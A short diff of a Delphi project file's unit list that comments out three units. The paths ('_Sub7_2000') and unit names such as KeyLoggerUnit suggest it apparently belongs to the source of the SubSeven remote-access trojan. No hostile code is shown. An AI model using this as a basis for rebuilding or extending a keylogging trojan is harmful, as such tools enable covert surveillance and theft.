@@ -4,7 +4,7 @@ uses
   Forms,
   MainUnit in 'MainUnit.pas' {MainForm},
   MainColors in 'MainColors.pas',
-  parole in 'parole.pas',
+  //parole in 'parole.pas',
   AnimUnit in 'AnimUnit.pas' {Anim},
   KeyLoggerUnit in 'KeyLoggerUnit.pas' {Keylogger},
   showmessageunit in 'showmessageunit.pas' {GetTextForm},
@@ -34,9 +34,9 @@ uses
   ThreadUnit in 'ThreadUnit.pas' {Dlg},
   AddPortUnit in 'AddPortUnit.pas' {AddPort},
   AddressBookUnit in 'AddressBookUnit.pas' {AddressBook},
-  BookMarkUnit in 'BookMarkUnit.pas' {Bookmarks},
-  ZLIBArchive in '..\..\Delphi4\_Sub7_2000\_ZIP\zlibarchive.PAS',
-  GIFImage in '..\..\Delphi4\3.0\skins\gifimage.pas';
+  BookMarkUnit in 'BookMarkUnit.pas' {Bookmarks};
+  //ZLIBArchive in '..\..\Delphi4\_Sub7_2000\_ZIP\zlibarchive.PAS',
+  // in '..\..\Delphi4\3.0\skins\gifimage.pas';
 
 {$R *.RES}
 var SplashAbout:TMsgForm;
